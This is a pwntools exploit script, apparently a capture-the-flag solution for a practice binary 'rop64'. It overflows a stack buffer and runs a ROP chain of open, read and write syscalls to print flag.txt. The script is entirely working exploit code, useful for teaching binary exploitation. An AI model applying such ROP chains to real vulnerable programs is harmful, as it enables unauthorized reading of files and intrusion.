from pwn import *
elf = ELF("rop64")

r = process("./rop64")
pop_rax = p64(0x000000000040115e)
pop_rdi = p64(0x0000000000401160)
pop_rsi = p64(0x0000000000401162)
pop_rdx = p64(0x0000000000401164)
syscall = p64(0x0000000000401166)

bss = elf.bss()
gets = p64(0x401060)

payload = b"A"*72 
payload += pop_rdi + p64(bss) + gets    #flag.txt_bss
payload += pop_rax + p64(2) + pop_rdi + p64(bss) + pop_rsi + p64(0) + pop_rdx + p64(0) + syscall #open
payload += pop_rax + p64(0) + pop_rdi + p64(3) + pop_rsi + p64(0x404028) + pop_rdx + p64(8) + syscall #read
payload += pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + p64(0x404028) + pop_rdx + p64(5) + syscall #write
payload += pop_rax + p64(60) + pop_rdi + p64(0) + syscall #exit

r.sendline(payload)
r.sendline("flag.txt\x00")
r.interactive()
